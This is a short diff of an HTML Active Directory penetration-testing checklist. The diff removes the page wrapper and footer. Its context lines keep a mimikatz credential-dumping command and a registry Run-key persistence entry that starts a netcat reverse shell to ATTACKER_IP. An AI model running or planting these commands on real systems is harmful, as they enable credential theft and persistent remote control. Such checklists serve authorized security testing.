@@ -1,17 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AD Penetration Testing Checklist</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <header>
-        <h1>AD Penetration Testing Checklist</h1>
-    </header>
-    <main>
-      <section>
+<section>
   <span class="icon solid major fa-search"></span>
   <h3>Recon & Enumeration</h3>
   <pre><code>
@@ -139,10 +126,3 @@ mimikatz: sekurlsa::logonpasswords
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "cmd.exe /c nc.exe -e cmd.exe ATTACKER_IP 4444"
   </code></pre>
 </section>
-
-    </main>
-    <footer>
-        <p>&copy; 2024 WillJTools</p>
-    </footer>
-</body>
-</html>
